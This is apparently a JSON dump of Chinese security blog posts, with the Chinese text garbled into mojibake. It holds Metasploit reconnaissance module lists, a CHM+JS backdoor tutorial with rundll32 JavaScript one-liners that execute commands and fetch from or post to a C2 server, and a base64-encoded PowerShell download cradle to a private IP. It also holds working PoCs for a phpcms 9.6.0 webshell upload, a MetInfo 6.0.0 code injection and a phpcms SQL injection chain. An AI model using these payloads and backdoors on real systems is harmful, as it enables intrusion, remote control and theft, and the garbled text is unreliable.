Âü∫‰∫éSqlDataSourceEnumerator1PowerShell -Command \"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()\" 1.8 Âü∫‰∫émsfÂèëÁé∞‰∏ªÊú∫httpÊúçÂä°1auxiliary/scanner/http/http_version 1auxiliary/scanner/http/title smbÊúçÂä°1auxiliary/scanner/smb/smb_version ftpÊúçÂä°1auxiliary/scanner/ftp/ftp_version 1auxiliary/scanner/ftp/anonymous arpÊúçÂä°1auxiliary/scanner/discovery/arp_sweep udpÊúçÂä°1auxiliary/scanner/discovery/udp_sweep 1auxiliary/scanner/discovery/udp_probe sshÊúçÂä°1auxiliary/scanner/ssh/ssh_version telnetÊúçÂä°1auxiliary/scanner/telnet/telnet_version dnsÊúçÂä°1auxiliary/scanner/dns/dns_amp mysqlÊúçÂä°1auxiliary/scanner/mysql/mysql_version netbiosÊúçÂä°1auxiliary/scanner/netbios/nbname db2ÊúçÂä°1auxiliary/scanner/db2/db2_version Á´ØÂè£ÂèëÁé∞1auxiliary/scanner/portscan/ack 1auxiliary/scanner/portscan/tcp 1auxiliary/scanner/portscan/syn 1auxiliary/scanner/portscan/syn 1auxiliary/scanner/portscan/ftpbounce 1auxiliary/scanner/portscan/xmas rdpÊúçÂä°1auxiliary/scanner/rdp/rdp_scanner smtpÊúçÂä°1auxiliary/scanner/smtp/smtp_version pop3ÊúçÂä°1auxiliary/scanner/pop3/pop3_version posgresÊúçÂä°1auxiliary/scanner/postgres/postgres_version Ë∞ÉÁî®nmap1db_nmap postÁªÑ‰ª∂1234567891011windows/gather/arp_scanner windows/gather/enum_ad_computers windows/gather/enum_computers windows/gather/enum_domain windows/gather/enum_domains windows/gather/enum_ad_user_commentslinux/gather/enum_network linux/busybox/enum_hosts windows/gather/enum_ad_users windows/gather/enum_domain_tokens windows/gather/enum_snmp","categories":[],"tags":[{"name":"ÂÜÖÁΩëÊ∏óÈÄè","slug":"ÂÜÖÁΩëÊ∏óÈÄè","permalink":"http://patrilic.top/tags/ÂÜÖÁΩëÊ∏óÈÄè/"}]},{"title":"JS+CHMÊçÜÁªëÂêéÈó®","slug":"JS + CHM ÊçÜÁªëÂêéÈó®","date":"2019-04-03T03:58:32.000Z","updated":"2019-07-13T03:01:24.455Z","comments":true,"path":"2019/04/03/JS + CHM ÊçÜÁªëÂêéÈó®/","link":"","permalink":"http://patrilic.top/2019/04/03/JS + CHM ÊçÜÁªëÂêéÈó®/","excerpt":"","text":"Â≠¶‰∫Ü‰∏ÄÊ≥¢evi1cgÂçöÂÆ¢‰∏äÁöÑÊçÜÁªëÂêéÈó®ÔºåÂÅö‰∏™ËÆ∞ÂΩï 0x01 ÊÄùË∑Ø ÊÄùË∑ØÔºöÂà©Áî®CHMÂêéÈó®Ë∞ÉÁî®rundll32.exeÊâßË°åjavascriptËé∑ÂèñÊÅ∂ÊÑè‰ª£Á†ÅÂπ∂ÊâßË°å ÁªìÊûúÔºö‰∫§‰∫íÂºèshell or meterpreterÔºàpoershellÔºâ 0x02 chmÂêéÈó®calc.exe P0c123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;command exec &lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt; &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt; &lt;PARAM name=&quot;Item1&quot; value=&apos;,calc.exe&apos;&gt; &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;&lt;/OBJECT&gt;&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;&lt;/body&gt;&lt;/html&gt; Âà©Áî®EasyCHMÁºñËØëhtmlÊñá‰ª∂ ËøêË°åÔºö 0x03 JSÂêéÈó®Ê†∏ÂøÉÊÄùË∑ØÔºörundll32.exe ÊâßË°å javascript ËÑöÊú¨ ËÆøÈóÆC&amp;CÊâßË°åÊÅ∂ÊÑè‰ª£Á†Å PocÔºö12rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert('foo'); 0x04 CHM + JS ÊçÜÁªëÊÄùË∑ØÔºöCHMÂêéÈó® ‚Äî-&gt; Ë∞ÉÁî®rundll32.exe ‚Äî‚Äì&gt; Ë∞ÉÁî®javascript. ‚Äî‚Äì&gt; ËÆøÈóÆÁõÆÊ†áC2ÊúçÂä°Âô® ‚Äî‚Äî&gt;ÊâßË°åÊÅ∂ÊÑè‰ª£Á†Å ‚Äî‚Äì&gt; ‰∫§‰∫íÂºèshell ‰ºòÁÇπÔºöÈò≤Ê≠¢‰º†ÁªüCHMÂêéÈó®‰ΩøÁî®CMD /c Êó∂ÂºïËµ∑ÁöÑÂºπÁ™ó Áº∫ÁÇπÔºö Áõ¥Êé•Ëé∑ÂèñMeterpreter Session ‰ΩøÁî®Exploit Ôºö exploit/multi/script/web_delivery Â≠òÂú®ÁâπÊÆäÂ≠óÁ¨¶ÔºåÂú®cmd‰∏ãÊòØ‰∏çËÉΩÁõ¥Êé•ËøêË°åÁöÑ,‰ΩøÁî®Base64ÁºñÁ†ÅÔºö Powershell :1powershell -ep bypass -enc PQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAzADoAOAAwADgAMQAvADEALwAnACkAOwAKAA== But: Âπ∂‰∏çËÉΩbypass 360‰∏ªÈò≤ÂÖÅËÆ∏Á®ãÂ∫èÊâßË°åÂêéÔºåÂèØÂæóÂà∞JSRAT Session ‰ª•Âèä meterpreter Session ‰∏ªË¶ÅËøòÊòØÊ£ÄÊµã‰∫Ürundll32.exe Ëøô‰∏™ÊïèÊÑüËøõÁ®ã 0x05 ÊÄªÁªìJSÂêéÈó®‰ºòÁÇπÔºö Êó†Êñá‰ª∂ËêΩÂú∞ ÊåÅÁª≠ÊéßÂà∂ ÂêéÂè∞rundll32.exeËøõÁ®ãÁ®≥ÂÆö Áº∫ÁÇπÔºö‰∏çÂÖçÊùÄÔºåÂÆπÊòìË¢´Ê£ÄÊµã CHMÂêéÈó®‰ºòÁÇπÔºöÈíìÈ±ºÂº∫‰∏ç‰ºöË¢´AVÊ£ÄÊµãÔºåÂè™‰ºöÂú®Ë∞ÉÁî®Âç±Èô©ËøõÁ®ãÊó∂Ë¢´Ê£ÄÊµãÔºåÊú¨Ë∫´‰∏çÂê´ÊúâÊÅ∂ÊÑè‰ª£Á†Å ÈÖçÂêàÂèØ‰ª•ËææÂà∞nishang‰∏≠‰∏çÂºπÁ™óÁöÑÊïàÊûú 0x06 JS backdoor Tips//Execute A Command1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;); //Write To A File1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);a=fso.CreateTextFile(&quot;c:\\\\Temp\\\\testfile.txt&quot;,true);a.WriteLine(&quot;Test&quot;);a.Close();self.close; //Read and Execute From A File1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);f=fso.OpenTextFile(&quot;c:\\\\Temp\\\\testfile.txt&quot;,1);eval((f.ReadAll())); //Map A Remote Share (WEBDAV)1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;n=new%20ActiveXObject(&apos;WScript.Network&apos;);n.MapNetworkDrive(&quot;S:&quot;,&quot;https://live.sysinternals.com&quot;);self.close; //Map A Local Share1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;n=new%20ActiveXObject(&apos;WScript.Network&apos;);n.MapNetworkDrive(&quot;S:&quot;,&quot;\\\\\\\\Localhost\\\\c$&quot;);self.close; //Read and Execute Commands From A File1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);f=fso.OpenTextFile(&quot;c:\\\\Temp\\\\Commands.txt&quot;,1);while(!f.AtEndOfStream)&#123;t=new%20ActiveXObject(&quot;WScript.Shell&quot;);t.Run(&quot;cmd%20/c%20&quot;%20+%20f.ReadLine(),null,true);&#125;; //Retrieve Commands From HTTP1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1/a.txt&quot;,false);h.Send();B=h.ResponseText;alert(B); //POST results back to Server1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;POST&quot;,&quot;http://127.0.0.1:8081/a.php&quot;,false);h.Send(&quot;Stuff&quot;); 0x07 Linkshttps://evi1cg.me/archives/chm_backdoor.htmlhttp://drops.wooyun.org/tips/8568https://github.com/Ridter/MyJSRathttp://drops.wooyun.org/tips/11764http://drops.wooyun.org/tips/12386","categories":[],"tags":[{"name":"Backdoor","slug":"Backdoor","permalink":"http://patrilic.top/tags/Backdoor/"}]},{"title":"phpcms_v9.6.0 ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†","slug":"phpcms_v9.6.0 ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†","date":"2019-04-03T02:58:32.000Z","updated":"2019-07-13T03:01:12.762Z","comments":true,"path":"2019/04/03/phpcms_v9.6.0 ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†/","link":"","permalink":"http://patrilic.top/2019/04/03/phpcms_v9.6.0 ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†/","excerpt":"","text":"0x01 ÊºèÊ¥ûÂàÜÊûêÊºèÊ¥û urlÔºö http://localhost/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1 Ë∑üËøõ /Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/member/index.php ÊºèÊ¥û‰ª£Á†Å‰ªé129Ë°å-136Ë°å1234567if($member_setting['choosemodel']) &#123; require_once CACHE_MODEL_PATH.'member_input.class.php'; require_once CACHE_MODEL_PATH.'member_update.class.php'; $member_input = new member_input($userinfo['modelid']); $_POST['info'] = array_map('new_html_special_chars',$_POST['info']); $user_model_info = $member_input-&gt;get($_POST['info']); &#125; $_POST[‚Äòinfo‚Äô] Ë¢´ÂáΩÊï∞ new_html_special_chars ËøáÊª§‰∏ÄÈÅç1234567function new_html_special_chars($string) &#123; $encoding = 'utf-8'; if(strtolower(CHARSET)=='gbk') $encoding = 'ISO-8859-15'; if(!is_array($string)) return htmlspecialchars($string,ENT_QUOTES,$encoding); foreach($string as $key =&gt; $val) $string[$key] = new_html_special_chars($val); return $string;&#125; htmlspecialchars($string, ENT_QUOTES, $encoding)ÂÆû‰ΩìÂåñÁºñÁ†Å ÂçïÂºïÂè∑ÂíåÂèåÂºïÂè∑1234567891011121314151617181920212223242526272829303132333435function get($data) &#123; $this-&gt;data = $data = trim_script($data); $model_cache = getcache('member_model', 'commons'); $this-&gt;db-&gt;table_name = $this-&gt;db_pre.$model_cache[$this-&gt;modelid]['tablename']; $info = array(); $debar_filed = array('catid','title','style','thumb','status','islink','description'); if(is_array($data)) &#123; foreach($data as $field=&gt;$value) &#123; if($data['islink']==1 &amp;&amp; !in_array($field,$debar_filed)) continue; $field = safe_replace($field); $name = $this-&gt;fields[$field]['name']; $minlength = $this-&gt;fields[$field]['minlength']; $maxlength = $this-&gt;fields[$field]['maxlength']; $pattern = $this-&gt;fields[$field]['pattern']; $errortips = $this-&gt;fields[$field]['errortips']; if(empty($errortips)) $errortips = \"$name ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ“™ÔøΩÔøΩ\"; $length = empty($value) ? 0 : strlen($value); if($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(\"$name ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ $minlength ÔøΩÔøΩÔøΩ÷∑ÔøΩÔøΩÔøΩ\"); if (!array_key_exists($field, $this-&gt;fields)) showmessage('ƒ£ÔøΩÔøΩÔøΩ–≤ÔøΩÔøΩÔøΩÔøΩÔøΩ'.$field.'ÔøΩ÷∂ÔøΩ'); if($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) &#123; showmessage(\"$name ÔøΩÔøΩÔøΩ√≥ÔøΩÔøΩÔøΩ $maxlength ÔøΩÔøΩÔøΩ÷∑ÔøΩÔøΩÔøΩ\"); &#125; else &#123; str_cut($value, $maxlength); &#125; if($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips); if($this-&gt;fields[$field]['isunique'] &amp;&amp; $this-&gt;db-&gt;get_one(array($field=&gt;$value),$field) &amp;&amp; ROUTE_A != 'edit') showmessage(\"$name ÔøΩÔøΩ÷µÔøΩÔøΩÔøΩÔøΩÔøΩÿ∏ÔøΩÔøΩÔøΩ\"); $func = $this-&gt;fields[$field]['formtype']; if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value); $info[$field] = $value; &#125; &#125; return $info; &#125; ÂèÇÊï∞‰º†ÂÖ•ÔºöÈ¶ñÂÖàÁªèËøá trim_script ÂáΩÊï∞Ôºå ËøáÊª§ÊéâscriptÂíåiframe1234567function trim_script($str) &#123; $str = preg_replace ( '/\\&lt;([\\/]?)script([^\\&gt;]*?)\\&gt;/si', '&amp;lt;\\\\1script\\\\2&amp;gt;', $str ); $str = preg_replace ( '/\\&lt;([\\/]?)iframe([^\\&gt;]*?)\\&gt;/si', '&amp;lt;\\\\1iframe\\\\2&amp;gt;', $str ); $str = preg_replace ( '/\\&lt;([\\/]?)frame([^\\&gt;]*?)\\&gt;/si', '&amp;lt;\\\\1frame\\\\2&amp;gt;', $str ); $str = preg_replace ( '/]]\\&gt;/si', ']] &gt;', $str ); return $str;&#125; ÂÜçÁªèËøásafe_replace ÂáΩÊï∞ÔºåËøáÊª§ÁâπÊÆäÂ≠óÁ¨¶12345678910111213141516function safe_replace($string) &#123; $string = str_replace('%20','',$string); // Á©∫Ê†º $string = str_replace('%27','',$string); // ÂçïÂºïÂè∑ $string = str_replace('%2527','',$string); // ÂèåÈáçÁºñÁ†Å $string = str_replace('*','',$string); $string = str_replace('\"','&amp;quot;',$string); $string = str_replace(\"'\",'',$string); $string = str_replace('\"','',$string); $string = str_replace(';','',$string); $string = str_replace('&lt;','&amp;lt;',$string); $string = str_replace('&gt;','&amp;gt;',$string); $string = str_replace(\"&#123;\",'',$string); $string = str_replace('&#125;','',$string); $string = str_replace('\\\\','',$string); return $string;&#125; 12$func = $this-&gt;fields[$field]['formtype']; if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value); ediotr ÊñπÊ≥ï1234567891011function editor($field, $value) &#123; $setting = string2array($this-&gt;fields[$field]['setting']); $enablesaveimage = $setting['enablesaveimage']; if(isset($_POST['spider_img'])) $enablesaveimage = 0; if($enablesaveimage) &#123; $site_setting = string2array($this-&gt;site_config['setting']); $watermark_enable = intval($site_setting['watermark_enable']); $value = $this-&gt;attachment-&gt;download('content', $value,$watermark_enable); &#125; return $value; &#125; $value = $this-&gt;attachment-&gt;download(‚Äòcontent‚Äô, $value, $watermark_enable); ‰º†ÂÖ•ÁöÑË¢´Â∏¶ÂÖ•downloadÂáΩÊï∞ 123456789101112131415161718192021222324252627282930313233343536373839404142434445function download($field, $value,$watermark = '0',$ext = 'gif|jpg|jpeg|bmp|png', $absurl = '', $basehref = '') &#123; global $image_d; $this-&gt;att_db = pc_base::load_model('attachment_model'); $upload_url = pc_base::load_config('system','upload_url'); $this-&gt;field = $field; $dir = date('Y/md/'); $uploadpath = $upload_url.$dir; $uploaddir = $this-&gt;upload_root.$dir; $string = new_stripslashes($value); if(!preg_match_all(\"/(href|src)=([\\\"|']?)([^ \\\"'&gt;]+\\.($ext))\\\\2/i\", $string, $matches)) return $value; $remotefileurls = array(); foreach($matches[3] as $matche) &#123; if(strpos($matche, '://') === false) continue; dir_create($uploaddir); $remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref); &#125; unset($matches, $string); $remotefileurls = array_unique($remotefileurls); $oldpath = $newpath = array(); foreach($remotefileurls as $k=&gt;$file) &#123; if(strpos($file, '://') === false || strpos($file, $upload_url) !== false) continue; $filename = fileext($file); $file_name = basename($file); $filename = $this-&gt;getname($filename); $newfile = $uploaddir.$filename; $upload_func = $this-&gt;upload_func; if($upload_func($file, $newfile)) &#123; $oldpath[] = $k; $GLOBALS['downloadfiles'][] = $newpath[] = $uploadpath.$filename; @chmod($newfile, 0777); $fileext = fileext($filename); if($watermark)&#123; watermark($newfile, $newfile,$this-&gt;siteid); &#125; $filepath = $dir.$filename; $downloadedfile = array('filename'=&gt;$filename, 'filepath'=&gt;$filepath, 'filesize'=&gt;filesize($newfile), 'fileext'=&gt;$fileext); $aid = $this-&gt;add($downloadedfile); $this-&gt;downloadedfiles[$aid] = $filepath; &#125; &#125; return str_replace($oldpath, $newpath, $value); &#125; wafÔºö if(!preg_match_all(‚Äú/(href|src)=([\\‚Äù|‚Äô]?)([^ \\‚Äù‚Äò&gt;]+.($ext))\\2/i‚Äù, $string, $matches)) return $value; ÂêéÁºÄÔºö$ext = ‚Äògif|jpg|jpeg|bmp|png‚Äô‰ΩøÁî® php#.jpg ÁªïËøá ËøõÂÖ•Âà∞ fillurl ÂáΩÊï∞Âú® 301 Ë°åÂéªÊéâ‰∫Ü # \\$pos = strpos($surl,‚Äô#‚Äô); $remotefileurls = http://url/shell.php 0x02 ÊºèÊ¥ûÂ§çÁé∞ 0x03 POC1234567891011121314151617181920212223# -*- coding: utf-8 -*-# @Time : 2018-12-20 22:57# @Author : Patrilic# @FileName: file_writein_poc.py# @Software: PyCharmimport requestsurl = 'http://localhost/phpcms_V9.6.0/install_package/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1'data = &#123; 'siteid': '1', 'modelid': '1', 'username': 'test', 'password': 'testxx', 'email': 'test@test.com', 'info[content]': '&lt;img src=http://url/shell.txt?.php#.jpg&gt;', 'dosubmit': '1',&#125;poc = requests.post(url,data= data)print(poc)","categories":[],"tags":[{"name":"‰ª£Á†ÅÂÆ°ËÆ°","slug":"‰ª£Á†ÅÂÆ°ËÆ°","permalink":"http://patrilic.top/tags/‰ª£Á†ÅÂÆ°ËÆ°/"}]},{"title":"Metinfo 6.0.0 ‰ªªÊÑè‰ª£Á†ÅÂÜôÂÖ•ÂØºËá¥getshell","slug":"Metinfo 6.0.0 ‰ªªÊÑè‰ª£Á†ÅÂÜôÂÖ•","date":"2019-04-03T02:58:32.000Z","updated":"2019-07-13T03:01:20.760Z","comments":true,"path":"2019/04/03/Metinfo 6.0.0 ‰ªªÊÑè‰ª£Á†ÅÂÜôÂÖ•/","link":"","permalink":"http://patrilic.top/2019/04/03/Metinfo 6.0.0 ‰ªªÊÑè‰ª£Á†ÅÂÜôÂÖ•/","excerpt":"","text":"0x01 ÊºèÊ¥ûÂàÜÊûêÊºèÊ¥ûÂÖ≥ÈîÆÁÇπ‰Ωç‰∫é/Applications/MxSrvs/www/MetInfo6.0.0/admin/include/global.func.php‰∏≠Á∫¶878Ë°åÁöÑCopyindxÂáΩÊï∞12345678function Copyindx($newindx,$type)&#123; if(!file_exists($newindx))&#123; $oldcont =\"&lt;?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\n\\$filpy = basename(dirname(__FILE__));\\n\\$fmodule=$type;\\nrequire_once '../include/module.php'; \\nrequire_once \\$module; \\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?&gt;\"; $fp = fopen($newindx,w); fputs($fp, $oldcont); fclose($fp); &#125;&#125; $typeÂèØÊéßÔºåÂπ∂‰∏îÁõ¥Êé•Â∏¶ÂÖ•Âà∞php‰ª£Á†Å‰∏≠ÔºåÂâçÊèêÊòØ‰∏çÂ≠òÂú® $newindx ÂèòÈáèÔºåÂæÄ‰∏äË∑üÂáΩÊï∞ ‰Ωç‰∫é/Applications/MxSrvs/www/MetInfo6.0.0/admin/column/global.func.phpÁöÑ124Ë°åË∞ÉÁî®ËØ•ÂáΩÊï∞1Copyindx(ROOTPATH.$foldername.'/index.php',$module); ËßÑÂÆö $newindx ‰∏∫ÁõÆÂΩïÂêç + /index.php, ÁÑ∂Âêé $module ËØ•Êñá‰ª∂ ÂÜçÂæÄ‰∏äË∑üÔºåÊâæÂà∞/Applications/MxSrvs/www/MetInfo6.0.0/admin/column/save.php 12345678910111213if($if_in==0)&#123; if($filename!='' &amp;&amp; $filename!=$filenameold)&#123; $filenameok = $db-&gt;get_one(\"SELECT * FROM &#123;$met_column&#125; WHERE filename='&#123;$filename&#125;' and foldername='$foldername' and id!='$id'\"); if($filenameok)metsave('-1',$lang_modFilenameok); if(is_numeric($filename) &amp;&amp; $filename!=$id &amp;&amp; $met_pseudo)&#123; $filenameok1 = $db-&gt;get_one(\"SELECT * FROM &#123;$met_column&#125; WHERE id='&#123;$filename&#125;' and foldername='$foldername'\"); if($filenameok1)metsave('-1',$lang_jsx30); &#125; &#125; $filedir=\"../../\".$foldername; if(!file_exists($filedir))@mkdir($filedir,0777); if(!file_exists($filedir))metsave('-1',$lang_modFiledir); column_copyconfig($foldername,$module,$id); Êª°Ë∂≥ËØ•Êù°‰ª∂Âç≥ÂèØË∞ÉÁî®colnmn_copyconfig()ÂáΩÊï∞ ÊîªÂáªÊµÅÁ®ã ÁôªÈôÜÂêéÂè∞ ÊûÑÈÄ†payloadÔºöadmin/column/save.php?name=123&amp;action=editor&amp;foldername=upload&amp;module=22;phpinfo();/* ËÆøÈóÆ/upload/index.php Ê≥®ÊÑèÔºö foldernameÂèØÊéßÔºåÂ¶ÇÊûúuploadÁõÆÂΩï‰∏ãÂ≠òÂú®index.phpÔºå‰∏ç‰ºöÈáçÂ§çÂÜôÂÖ•ÔºåÊõ¥Êç¢ÁõÆÂΩïÂç≥ÂèØ /* ÂøÖÈ°ªË¶ÅÊ±ÇÔºå‰ºöÊ≥®ÈáäÊéâÂêéÈù¢ÁöÑrequire_once ‚Äò../include/module.php‚Äô; Èò≤Ê≠¢Ë∑≥ËΩ¨Âà∞404È°µÈù¢ 0x02 ÊºèÊ¥ûÂ§çÁé∞","categories":[],"tags":[{"name":"‰ª£Á†ÅÂÆ°ËÆ°","slug":"‰ª£Á†ÅÂÆ°ËÆ°","permalink":"http://patrilic.top/tags/‰ª£Á†ÅÂÆ°ËÆ°/"}]},{"title":"phpcms_v9.6.0 wapÊ®°Âùó SQLÊ≥®ÂÖ•","slug":"phpcms_v9.6.0 wapÊ®°Âùó sqlÊ≥®ÂÖ•","date":"2019-04-03T02:58:32.000Z","updated":"2019-07-13T03:01:08.367Z","comments":true,"path":"2019/04/03/phpcms_v9.6.0 wapÊ®°Âùó sqlÊ≥®ÂÖ•/","link":"","permalink":"http://patrilic.top/2019/04/03/phpcms_v9.6.0 wapÊ®°Âùó sqlÊ≥®ÂÖ•/","excerpt":"","text":"0x01 ÊºèÊ¥ûÂàÜÊûêÊºèÊ¥ûÂèëÁîüÂú® /Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/content/down.php 12345678910111213141516public function init() &#123; $a_k = trim($_GET['a_k']); if(!isset($a_k)) showmessage(L('illegal_parameters')); $a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system','auth_key')); if(empty($a_k)) showmessage(L('illegal_parameters')); unset($i,$m,$f); parse_str($a_k); if(isset($i)) $i = $id = intval($i); if(!isset($m)) showmessage(L('illegal_parameters')); if(!isset($modelid)||!isset($catid)) showmessage(L('illegal_parameters')); if(empty($f)) showmessage(L('url_invalid')); $allow_visitor = 1; $MODEL = getcache('model','commons'); $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid]['tablename']; $this-&gt;db-&gt;table_name = $tablename.'_data'; $rs = $this-&gt;db-&gt;get_one(array('id'=&gt;$id)); $_GET ÊñπÊ≥ï‰º†ÂÖ• $a_k Ôºå ÁªèËøásys_auth Ëß£ÂØÜ‰πãÂêéÔºåËøõÂÖ• parse_str,Ëß£ÊûêÂà∞ÂèòÈáè‰∏≠ÊúÄÂêéÂ∏¶ÂÖ•Âà∞ \\$rs = \\$this-&gt;db-&gt;get_one(array(‚Äòid‚Äô=&gt;$id)); ËøõË°åÊü•ËØ¢ ÊâÄ‰ª•Áé∞Âú®Â¶ÇÊûúËÉΩÊâæÂà∞‰∏Ä‰∏™ÁªèËøásys_auth Âπ∂ËÉΩÂõûÊòæÁªôÊàëpayloadÁöÑÂú∞ÊñπÂç≥ÂèØ /Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/attachment/attachments.php 123456789101112131415public function swfupload_json() &#123; $arr['aid'] = intval($_GET['aid']); $arr['src'] = safe_replace(trim($_GET['src'])); $arr['filename'] = urlencode(safe_replace($_GET['filename'])); $json_str = json_encode($arr); $att_arr_exist = param::get_cookie('att_json'); $att_arr_exist_tmp = explode('||', $att_arr_exist); if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123; return true; &#125; else &#123; $json_str = $att_arr_exist ? $att_arr_exist.'||'.$json_str : $json_str; param::set_cookie('att_json',$json_str); return true; &#125; &#125; ÂÖàÁªèËøásafe_replace ÂáΩÊï∞ÔºåËøáÊª§‰∏ÄÈÅçÔºåÁÑ∂ÂêéÂ≠òÂÖ•Êï∞ÁªÑÔºåÂ¶ÇÊûú‰∏çÊª°Ë∂≥Êù°‰ª∂ËøõÂÖ• set_cookieÂáΩÊï∞12345678910111213public static function set_cookie($var, $value = '', $time = 0) &#123; $time = $time &gt; 0 ? $time : ($value == '' ? SYS_TIME - 3600 : 0); $s = $_SERVER['SERVER_PORT'] == '443' ? 1 : 0; $var = pc_base::load_config('system','cookie_pre').$var; $_COOKIE[$var] = $value; if (is_array($value)) &#123; foreach($value as $k=&gt;$v) &#123; setcookie($var.'['.$k.']', sys_auth($v, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s); &#125; &#125; else &#123; setcookie($var, sys_auth($value, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s); &#125; &#125; ÂèØ‰ª•ÁúãÂà∞ÔºåÂØπ‰º†ÂÖ•ÁöÑvalue ËøõË°å‰∏ÄÊ¨°sys_auth ÁÑ∂ÂêésetcookieÔºåÂèØ‰ª•Âú®ËøîÂõûÂåÖ‰∏≠ÊãøÂà∞ÂõûÊòæ ÊúÄÂêéËøòÈúÄË¶ÅÂ≠òÂú®‰∏Ä‰∏™cookieÔºåËÆ©Êàë‰ª¨‰∏çË¢´Ë∑≥ËΩ¨Âà∞mainÁïåÈù¢/Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/wap/index.php1234function __construct() &#123; $this-&gt;db = pc_base::load_model('content_model'); $this-&gt;siteid = isset($_GET['siteid']) &amp;&amp; (intval($_GET['siteid']) &gt; 0) ? intval(trim($_GET['siteid'])) : (param::get_cookie('siteid') ? param::get_cookie('siteid') : 1); param::set_cookie('siteid',$this-&gt;siteid); ÈÄöËøáGETÊñπÊ≥ïÂæóÂà∞$siteidÔºåÁÑ∂Âêé‰º†Âà∞‰∫Üset_cookie()ÂáΩÊï∞‰∏≠ÔºåÊª°Ë∂≥Êù°‰ª∂„ÄÇ ÊîªÂáªÈìæÔºö ËÆøÈóÆ /index.php?m=wap&amp;a=index&amp;siteid=1 „ÄÇËé∑ÂèñÂìçÂ∫îÂ§¥ÁöÑset-CookieÂ≠óÊÆµ„ÄÇ Â∞ÜÂâç‰∏ÄÊ≠•Ëé∑ÂèñÂà∞ÁöÑÂ≠óÊÆµËµãÂÄºÁªôuserid_flashÔºå‰Ωú‰∏∫POSTÂèÇÊï∞„ÄÇËÆøÈóÆ /index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=„Äêpayload„Äë Ëé∑ÂèñËøîÂõûÂ§¥ÁöÑset‚ÄîCookieÂ≠óÊÆµÔºåÊ≠§Âç≥‰∏∫Âä†ÂØÜÂêéÁöÑpayload ËÆøÈóÆ /index.php?m=content&amp;c=down&amp;a_k=„ÄêÂä†ÂØÜÂêéÁöÑpayload„ÄëÔºåÊ≥®ÂÖ•ÊàêÂäü„ÄÇ 0x02 